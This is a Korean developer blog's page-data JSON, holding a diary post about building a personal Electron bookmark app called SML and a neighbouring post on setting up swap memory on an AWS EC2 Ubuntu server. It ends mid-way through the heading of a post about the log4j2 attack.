{"componentChunkName":"component---src-templates-post-template-index-tsx","path":"/til/211207-devnote/","result":{"data":{"cur":{"id":"da39d720-952b-5ed3-83e3-137414176b4b","html":"<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAA7EAAAOxAGVKw4bAAABMElEQVQoz42S0Y6CMBBFW6Cl0GmhxYorrJpAsolP+v8fdzetrqtmxX24GToZztxOhzHGcC+vCEOzwqA9drTCJ3XYmRX2NuDQrJN647A2LYzSeP6fPSciQBTir8KknGegvESTqwRXolwGRmdK/haFEDBNE7bDAOf9Q+26btCWehkYryfy4nbWWmMcxwQmopTjjF+aVRauomVgnFWeZQ85znnSc21XEnxtl4FxLnFOPyApZXJpjEFd18jumnmp0Wn7D4dXYLziPM84Ho84n844n06pwc2hJHS6eePQBpTi8srRTV4UYJwl5fLx9Z3UCNQuA3tlMbuPtIss42grwtZ22BiHnlz6vpw9Dm2PWqpl4A1cWXyFEVRWqLmAzmQSpShSLHnxfrH5NZJQmNzm5YK/0jegveteJRG0qAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/39caabbd44b8d6bf6560fecef746ecb3/7c297/thumbnail_til.webp 180w,\n/static/39caabbd44b8d6bf6560fecef746ecb3/33ecc/thumbnail_til.webp 360w,\n/static/39caabbd44b8d6bf6560fecef746ecb3/df77d/thumbnail_til.webp 720w,\n/static/39caabbd44b8d6bf6560fecef746ecb3/dd3ab/thumbnail_til.webp 895w\"\n              sizes=\"(max-width: 720px) 100vw, 720px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/39caabbd44b8d6bf6560fecef746ecb3/e9ea2/thumbnail_til.png 180w,\n/static/39caabbd44b8d6bf6560fecef746ecb3/53918/thumbnail_til.png 360w,\n/static/39caabbd44b8d6bf6560fecef746ecb3/242a6/thumbnail_til.png 720w,\n/static/39caabbd44b8d6bf6560fecef746ecb3/b002d/thumbnail_til.png 895w\"\n            sizes=\"(max-width: 720px) 100vw, 720px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/39caabbd44b8d6bf6560fecef746ecb3/242a6/thumbnail_til.png\"\n            alt=\"thumbnail\"\n            title=\"thumbnail\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<h2 id=\"개발을-하다보면-쌓이는-링크들\" style=\"position:relative;\"><a href=\"#%EA%B0%9C%EB%B0%9C%EC%9D%84-%ED%95%98%EB%8B%A4%EB%B3%B4%EB%A9%B4-%EC%8C%93%EC%9D%B4%EB%8A%94-%EB%A7%81%ED%81%AC%EB%93%A4\" aria-label=\"개발을 하다보면 쌓이는 링크들 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>개발을 하다보면 쌓이는 링크들…</h2>\n<p>개발을 하다보면 개발자의 성지 stackoverflow나 다른 사람의 기술 블로그를 많이 보게 된다.<br>\n그리고 유용한 것은 즐겨찾기에 저장하거나 페이지 탭에 그대로 두게 된다.</p>\n<p>문제는…<br>\n브라우저에서 제공하는 즐겨찾기는 몹시 불편하다.<br>\n제한적인 카테고리에 일정 수가 넘어가면 찾는데 어려움의 문제가 기다린다.</p>\n<p>두 번째로 페이지에 그냥 두면…</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 9.444444444444445%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAYAAABYBvyLAAAACXBIWXMAABYlAAAWJQFJUiTwAAAAjUlEQVQI1xXHSQ6CMABAUe5/G40idVi4VxC0JDigxcjChKktbaKLb3y7F8jJifM05xLm3FcFRSS5LSXVWqJEhhIp5XyPEgfKcIeKYkoRU20lz82Rh8goFgm3Rcp1lhAY12NHQ6cH3OdL3Xpa7bHeo51nMBY9aFpjUK+apu+ph57OjVjnaLTmPVr0+L/lB2m8kKjCH+8eAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/901355c67863511d19ef88a491fc8022/7c297/img_01.webp 180w,\n/static/901355c67863511d19ef88a491fc8022/33ecc/img_01.webp 360w,\n/static/901355c67863511d19ef88a491fc8022/df77d/img_01.webp 720w,\n/static/901355c67863511d19ef88a491fc8022/5c666/img_01.webp 1080w,\n/static/901355c67863511d19ef88a491fc8022/95f20/img_01.webp 1440w,\n/static/901355c67863511d19ef88a491fc8022/da202/img_01.webp 2874w\"\n              sizes=\"(max-width: 720px) 100vw, 720px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/901355c67863511d19ef88a491fc8022/e9ea2/img_01.png 180w,\n/static/901355c67863511d19ef88a491fc8022/53918/img_01.png 360w,\n/static/901355c67863511d19ef88a491fc8022/242a6/img_01.png 720w,\n/static/901355c67863511d19ef88a491fc8022/b4ad3/img_01.png 1080w,\n/static/901355c67863511d19ef88a491fc8022/89066/img_01.png 1440w,\n/static/901355c67863511d19ef88a491fc8022/9caaa/img_01.png 2874w\"\n            sizes=\"(max-width: 720px) 100vw, 720px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/901355c67863511d19ef88a491fc8022/242a6/img_01.png\"\n            alt=\"img 01\"\n            title=\"img 01\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<br>\n<p>이런 대 참사가 발생한다.</p>\n<p>그래서 이번에 노드 공부하다가 빠져버린 일렉트론으로 직접 개발해보기로 했다.<br>\n일단 1차 개발용 버전은 아래와 같다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 43.888888888888886%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAABYlAAAWJQFJUiTwAAABsUlEQVQoz22RyW4cMQwF+/8/K8slh2yGYztBDCQztmd6U2uh1pYqaNnHECAIUETpPXLYRoubAm7yyCwE7Ynak0zALpqnxxO/bh84//6LnXXvH+9xk55BHemRxWM3YeA/0Wi95pIZp4lVqV5TTr1vs0dKQoVjJkLbqF6o3jNobXBOEBE2bTBWEB9w4okxYp1jMwafIyEVQkism2JZV6wLaK2xRuGNxWvDcPw8zwtKKZQJnOfEy5q4qkTeK+PpifefPvL18Z5dVmoRvHimeUapjeANQb0QjSOXwrBtGucc1lpsKEwWJtuQ+GZ7s/x4uGO++0Y6fcCEEV/AOYtznlojzV6p4vv8cDqdmaaZZVmQUNh8Q/uGpAatoRp8fxpJ6gvTeOZmiUyHdXGIeOqeadFQU+6bH9ZVdemlZGKB0VRG07Ch9oGaJp7Xn5jtFqrqKvac0cZgrWPfI1UWdh9fgcdR5E2uT42Lblx1w4RXy5eYebZykNnrTm2Qc8F0oFB3TzXP7FZegdfryLKspBhxEf7MjdPSGHXtwOly4d3nGy6ZvoIjjuuP48g0L5TiqfbK7nwH/gOrIrUSm8DQEAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/6711758f70b52a3caf131fa9039bed03/7c297/img_02.webp 180w,\n/static/6711758f70b52a3caf131fa9039bed03/33ecc/img_02.webp 360w,\n/static/6711758f70b52a3caf131fa9039bed03/df77d/img_02.webp 720w,\n/static/6711758f70b52a3caf131fa9039bed03/5c666/img_02.webp 1080w,\n/static/6711758f70b52a3caf131fa9039bed03/95f20/img_02.webp 1440w,\n/static/6711758f70b52a3caf131fa9039bed03/2a4bd/img_02.webp 2790w\"\n              sizes=\"(max-width: 720px) 100vw, 720px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/6711758f70b52a3caf131fa9039bed03/e9ea2/img_02.png 180w,\n/static/6711758f70b52a3caf131fa9039bed03/53918/img_02.png 360w,\n/static/6711758f70b52a3caf131fa9039bed03/242a6/img_02.png 720w,\n/static/6711758f70b52a3caf131fa9039bed03/b4ad3/img_02.png 1080w,\n/static/6711758f70b52a3caf131fa9039bed03/89066/img_02.png 1440w,\n/static/6711758f70b52a3caf131fa9039bed03/f76ef/img_02.png 2790w\"\n            sizes=\"(max-width: 720px) 100vw, 720px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/6711758f70b52a3caf131fa9039bed03/242a6/img_02.png\"\n            alt=\"img 02\"\n            title=\"img 02\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<br>\n<p>이거 개발하면서 JS의 await / async 에 대해서 좀 어느정도 배우게 되었다.<br>\n나름 학습 효과가 있었던 미니 프로젝트였다.</p>\n<p>개발시간은… <a href=\"https://wakatime.com/badge/user/eab16459-c51d-412a-8a22-8b9056f6df54/project/e60715d4-f069-4ff9-a53c-33d15c0d0b61\"><img src=\"https://wakatime.com/badge/user/eab16459-c51d-412a-8a22-8b9056f6df54/project/e60715d4-f069-4ff9-a53c-33d15c0d0b61.svg\" alt=\"wakatime\"></a> 이 정도?</p>\n<p>근데 저거 벳지 클릭하면 404 나온다…<br>\n처음 써봤는데 신기하다 ㅎㅎ<br>\n오늘 기준으로 일주일 동안은 11시간을 쏟았군…</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAABYlAAAWJQFJUiTwAAAB9ElEQVQoz22S227TQBCG/Wpc8xQ8B0JCXHDDUyCu6D0qkagQ4iBE1QORKJRCEqI0sZ04dhx7bc8ePrTrhFLBSGOPV+N//293olY0q7Ilr3x2oW7FAA7nbtI6h7G3U4tw8m3E4CIh2TRYo4matmU6mzOZzpjNY5JlRpZvWW8UxaZivc7I84JqU9BVJV25RquSP2EFZ3sDPiJjLc5arLXgrO8ItdYGY/r069ON4dNcOImFYao5SzSnieY8NQyXhuNYs1SWyBhL0zRhl7jUjDIJItb2YtoLYhkVhncz4XOqefal5e1MOF5oPlwLH+cSvuPKEmmtg+D1RnO+EM7mwq9cB5c32eP457S0DCbCUjn+F5Fzlrys+R5X/EwqRmnNVaKIC8W2bigqRdMKOMNi0/FqpHg/VRyNFT+yFmc0TSe0XU8WBQce0Ujvwtda8M73uT9LkV7YH4G/Ya0lrPke//Za4VL2PGq1oG4qVlkezvDvcDvCrBaGi5pObWnb9l9kY3QomuwNXw/ukowf09Y5qunCD35Xt1Nb18LDl2MeDSY8P02Ci056gv28Rtb2gtv0KevLOyyv7pFmC+q66RE94E7wMqm5/2LM66ucB4fjsCZ+vPaU3qHn9/3SFZTpAaoc7hDtrZv24+UdHV4seXI0YbXtcXuCm77f2O9Mexca6okAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/827096ef9a542daaae3d1da9afe654b1/7c297/img_03.webp 180w,\n/static/827096ef9a542daaae3d1da9afe654b1/33ecc/img_03.webp 360w,\n/static/827096ef9a542daaae3d1da9afe654b1/df77d/img_03.webp 720w,\n/static/827096ef9a542daaae3d1da9afe654b1/5c666/img_03.webp 1080w,\n/static/827096ef9a542daaae3d1da9afe654b1/95f20/img_03.webp 1440w,\n/static/827096ef9a542daaae3d1da9afe654b1/ead8b/img_03.webp 2388w\"\n              sizes=\"(max-width: 720px) 100vw, 720px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/827096ef9a542daaae3d1da9afe654b1/e9ea2/img_03.png 180w,\n/static/827096ef9a542daaae3d1da9afe654b1/53918/img_03.png 360w,\n/static/827096ef9a542daaae3d1da9afe654b1/242a6/img_03.png 720w,\n/static/827096ef9a542daaae3d1da9afe654b1/b4ad3/img_03.png 1080w,\n/static/827096ef9a542daaae3d1da9afe654b1/89066/img_03.png 1440w,\n/static/827096ef9a542daaae3d1da9afe654b1/c37ef/img_03.png 2388w\"\n            sizes=\"(max-width: 720px) 100vw, 720px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/827096ef9a542daaae3d1da9afe654b1/242a6/img_03.png\"\n            alt=\"img 03\"\n            title=\"img 03\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<br>\n<p>솔직히 이야기 하면…<br>\n낮에 윈도 피시에서 주식창 띄우고 거래 보다가 개발하고…<br>\n밤에는 유튜브랑 넷플릭스 보면서 하고…<br>\n좀 더 집중했으면 더 빨리 만들 수 있었지 않을까…(유튭 스타 홍구랑 넷플 지옥, 아케인, 등등…너무 재미있어서 포기 못하겠다…)</p>\n<p>무튼 1차는 개인용으로 쓸만하다.\n이걸 좀 UI로 이쁘게 꾸며보고 조금 더 사용성을 높여서 배포해봐야겠다.</p>\n<p>이름은 뭐로 할까 하다가…할거 없어서 <strong>SML (Save My Link)</strong> 로 지었다.<br>\nGithub에 공개 레포는 팠는데…<br>\n아직 코드는 업뎃 안했다…<br>\nㄹㅇ 발로짠 코드 + JS 뉴비 스타일 이라서 손 볼게 좀 많다…</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 102.77777777777777%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAVCAYAAABG1c6oAAAACXBIWXMAABYlAAAWJQFJUiTwAAABi0lEQVQ4y5WVi66CQAxE/f8fNAgK+EJBfGsUhZrTmxJCzLVssllBOUxnuuuoaRr5b3YH18/ns73/7fejX0BmXdctbDwey/V6be8NAjLu97us12vZbDZSlqWcz2eZz+dSFMVX6E/g4/GQ7XYrSZJInudyPB4ljMIW2LXDVTKjqqpW1el0kul0qtcozrJM9vt9C3UB8W6xWMhut1OFwFCLDf2QXEBWygZwOBy0/DRN1U/m5XJRrwcBKY+SUbhcLvUFlI9qJlA38PV6ackoJKTZbKYlo5aJh6yE5A6FMlHIg6vVSqIo0nBYJ5OJthbDrRDPDEiyqCScIAgUihWDgJYsIVA+ivDSWgkr3MD3+61APEQJpQIjqH5zu/YyAyUWBB7iG0opl5fdbjefQgOihlaxtsFHQHEcq2K+H9zYBgSSJLEGZUA8dbeNASkbJTxsKYdhqECa2x0KK/4BxUOA9CUeAgZKYL5Q5G/lATtZgNl+5r5tSXcoTDY/SXK60Hd85uSmRwe3Tf+/pT+6J/cHjYNeVTYubIgAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/9ed3676918ac1e974bfac15a108c7461/7c297/img_04.webp 180w,\n/static/9ed3676918ac1e974bfac15a108c7461/33ecc/img_04.webp 360w,\n/static/9ed3676918ac1e974bfac15a108c7461/df77d/img_04.webp 720w,\n/static/9ed3676918ac1e974bfac15a108c7461/5c666/img_04.webp 1080w,\n/static/9ed3676918ac1e974bfac15a108c7461/b2cd5/img_04.webp 1140w\"\n              sizes=\"(max-width: 720px) 100vw, 720px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/9ed3676918ac1e974bfac15a108c7461/e9ea2/img_04.png 180w,\n/static/9ed3676918ac1e974bfac15a108c7461/53918/img_04.png 360w,\n/static/9ed3676918ac1e974bfac15a108c7461/242a6/img_04.png 720w,\n/static/9ed3676918ac1e974bfac15a108c7461/b4ad3/img_04.png 1080w,\n/static/9ed3676918ac1e974bfac15a108c7461/dc896/img_04.png 1140w\"\n            sizes=\"(max-width: 720px) 100vw, 720px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/9ed3676918ac1e974bfac15a108c7461/242a6/img_04.png\"\n            alt=\"img 04\"\n            title=\"img 04\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>보이는가…main.js에서만 작업한 흔적이…</p>\n<p>일단 이거는 그냥 취미로 만든거라서 편의 기능 위주만 추가할 예정이고, 일렉트론에 대한 부분은 업데이트 안할 예정이다.<br>\n그리고 일렉트론으로 좀 해본 결과 이것도 공부하려면 시간이 걸리고 귀찮아서 더 이상 일렉트론에 학습 시간을 투자하는 행위는 안하려 한다…</p>\n<p>그래서 <strong>일단 잘 돌아가면 끝</strong> 이라는 마인드로 개발했다.<br>\n사실 최종 목표는 Node.js로 작은 웹 서비스랑 연동 처리하는게 목표라서 일렉트론은 이제 <strong>Bye…</strong></p>\n<p><strong>SML</strong>에 기술적인 내용이랑 관련 문서는 조만간 정리해서 올릴 예정이다.<br>\n2주전인가 25일날 모빌리티쇼 다녀온거 영상이랑 사진 정리할게 많아서…</p>\n<p>혹시 21년 모빌리티쇼에 못가셔서 아쉬운 분은 <a href=\"https://www.youtube.com/watch?v=iY170ga0SJc\">개인 유튜브</a>에 올렸으니 관심있으신 분은 ㄱㄱ</p>\n<p>곧 <strong>SML</strong> 공식 문서 및 배포 소식으로 돌아올 예정…</p>","excerpt":"개발을 하다보면 쌓이는 링크들… 개발을 하다보면 개발자의 성지 stackoverflow나 다른 사람의 기술 블로그를 많이 보게 된다. 그리고 유용한 것은 즐겨찾기에 저장하거나 페이지 탭에 그대로 두게 된다. 문제는… 브라우저에서 제공하는 즐겨찾기는 몹시 불편하다. 제한적인 카테고리에 일정 수가 넘어가면 찾는데 어려움의 문제가 기다린다. 두 번째로 페이지에 그냥 두면…  이런 대 참사가 발생한다. 그래서 이번에 노드 공부하다가 빠져버린 일렉트론으로 직접 개발해보기로 했다. 일단 1차 개발용 버전은 아래와 같다.  이거 개발하면서 JS의 await / async 에 대해서 좀 어느정도 배우게 되었다. 나름 학습 효과가 있었던 미니 프로젝트였다. 개발시간은… wakatime 이 정도? 근데 저거 벳지 클릭하면 404 나온다… 처음 써봤는데 신기하다 ㅎㅎ 오늘 기준으로 일주일 동안은 11시간을 쏟았군…  솔직히 이야기 하면… 낮에 윈도 피시에서 주식창 띄우고 거래 보다가 개발하고… 밤에는…","frontmatter":{"date":"2021.12.07","title":"21년 12월 7일 연구일지 (with SML (Save My Link) 그냥 즐겨찾기 프로그램 만든 후기)","categories":"til","emoji":"📜"},"fields":{"slug":"/til/211207-devnote/"}},"next":{"id":"646cc0bc-09cd-5923-8466-58374f6135f2","html":"<h2 id=\"최근-aws의-ec2-인스턴스가\" style=\"position:relative;\"><a href=\"#%EC%B5%9C%EA%B7%BC-aws%EC%9D%98-ec2-%EC%9D%B8%EC%8A%A4%ED%84%B4%EC%8A%A4%EA%B0%80\" aria-label=\"최근 aws의 ec2 인스턴스가 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>최근 AWS의 EC2 인스턴스가…</h2>\n<p>현재 베타 테스트로 진행 중인 AWS의 EC2 인스턴스가 자꾸 상태이상 1/2 상태로 되면서 접속이 불가능했었다.<br>\n간헐적으로 일어나는걸 보면 뭔가 문제가 좀 심각한 거 같았다.</p>\n<p>AWS를 잘 쓰는 타입은 아니라서…<br>\n클라우드 워치인가 모니터링 툴을 봤는데 CPU 사용률이 갑자기 치솟다가 멈춰 버리는 구간이 보였다.</p>\n<p>정확히 표현하면 내가 운영하는 서비스에 로그가 기록되는데, 일정 시간 마지막 로그를 보면 그 CPU 사용률이 튄 뒤부터 로그가 끊겼다.<br>\n그렇다고 내 서비스가 CPU 파워를 엄청 쓰는 것도 아니고…접속률은 베타라서 그렇게 많지 않다.</p>\n<p>커널 로그인가에서 메모리 관련 에러를 찾아봤지만 없었다. (근데 메모리가 범인…)</p>\n<p>도데체 뭐가 문제인가 하다가 이것저것 검색을 하던 도중 나랑 <a href=\"https://sundries-in-myidea.tistory.com/102\">비슷한 증상을 가진 글</a> 을 보게 되었다.<br>\n여기에 나온것과 같이 메모리 문제였다.</p>\n<p><strong>근데 나 같은 경우 위에서 나온 명령어는 동작하지 않았다.</strong></p>\n<p>내 환경은 <strong>Ubuntu 20.04 LTS</strong>였다. (물론 지금 베타테스트 환경은 또 다르다…)\n위 운영체제를 기준으로 작성하겠다.</p>\n<br>\n<h3 id=\"swap-생성\" style=\"position:relative;\"><a href=\"#swap-%EC%83%9D%EC%84%B1\" aria-label=\"swap 생성 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Swap 생성</h3>\n<ol>\n<li>sudo fallocate -l 10G /swapfile</li>\n<li>sudo chmod 0600 /swapfile</li>\n<li>sudo mkswap /swapfile</li>\n<li>sudo swapon /swapfile</li>\n<li>free -m</li>\n</ol>\n<br>\n<p>위 명령어를 풀어서 설명하면…</p>\n<ol>\n<li>스왑 파일을 만드는 것 (난 대략 10Gb 정도 잡았다.)</li>\n<li>권한을 준다</li>\n<li>스왑 생성 (처리 결과는 아래 참조)</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">test@ip-999-99-999-99:/$ sudo mkswap /swapfile\nmkswap: /swapfile: warning: wiping old swap signature.\nSetting up swapspace version 1, size = 10 GiB (10737414144 bytes)\nno label, UUID=8a30d01e-c3b0-4ccc-bbbb-ada01aaaaac</code></pre></div>\n<ol start=\"4\">\n<li>스왑을 실행</li>\n<li>메모리 할당 확인 (아래 확인 -> 숫자는 임의로 적음 참고만..)</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">              total        used        free      shared  buff/cache   available\nMem:            968         485          90           0         393         330\nSwap:         10239         260        9979</code></pre></div>\n<br>\n<p>만약 뭔가 꼬이거나 스왑을 풀어야 할 경우 다시 아래대로 해준다.</p>\n<h3 id=\"swap-해제\" style=\"position:relative;\"><a href=\"#swap-%ED%95%B4%EC%A0%9C\" aria-label=\"swap 해제 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Swap 해제</h3>\n<ol>\n<li>sudo swapoff -v /swapfile</li>\n<li>sudo rm /swapfile</li>\n<li>free -m</li>\n</ol>\n<br>\n<p>보충 설명은 아래…</p>\n<ol>\n<li>스왑 해체</li>\n<li>스왑 파일 제거</li>\n<li>스왑이 풀렸는지 확인해본다</li>\n</ol>\n<br>\n<h2 id=\"정리\" style=\"position:relative;\"><a href=\"#%EC%A0%95%EB%A6%AC\" aria-label=\"정리 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>정리</h2>\n<p>EC2가 갑자기 내려가는 경우는 다양한데, 이번처럼 CPU 파워를 막 치고 가다 다운되는게 메모리 부족때문인지는 몰랐다.<br>\n사실 내가 잘못 로직을 짠게 있나 싶었는데…<br>\n무튼 이 뒤로 한 4일 갔는데 아직 증상이 나타나진 않고 안정적으로 잘 되고 있다.</p>\n<p>찾아보니 스왑은 아무래도 램이 아닌 하드 또는 SSD를 쓰는 거라서 퍼포먼스에서 이슈가 발생할 수 있다.<br>\n하지만 베타테스트 운영이나 개발 목적으로는 스왑을 써도 충분한거 같다.</p>\n<p>나중에는 결국 하드웨어 스팩을 돈으로 올려야 하겠지만 말이다. ㅎㅎ</p>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#%EC%B5%9C%EA%B7%BC-aws%EC%9D%98-ec2-%EC%9D%B8%EC%8A%A4%ED%84%B4%EC%8A%A4%EA%B0%80\">최근 AWS의 EC2 인스턴스가…</a></p>\n<ul>\n<li><a href=\"#swap-%EC%83%9D%EC%84%B1\">Swap 생성</a></li>\n<li><a href=\"#swap-%ED%95%B4%EC%A0%9C\">Swap 해제</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#%EC%A0%95%EB%A6%AC\">정리</a></p>\n</li>\n</ul>\n</div>","frontmatter":{"date":"2021.11.18","title":"aws ubuntu에서 swap 메모리 설정하기 (with EC2가 갑자기 상태 이상으로 접속 및 접근 불가)","categories":"aws","emoji":"📜"},"fields":{"slug":"/aws/211118_aws-ec2-swap/"}},"prev":{"id":"cae0b1d5-14fb-5436-a1bd-0581a43dfd26","html":"<h2 id=\"요새-시끄러운-log4j2-공격\" style=\"position:relative;\"><a href=\"#%EC%9A%94%EC%83%88-%EC%8B%9C%EB%81%84%EB%9F%AC%EC%9A%B4-log4j2-%EA%B3%B5%EA%B2%A9\" aria-label=\"요새 시끄러운 log4j2 공격 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 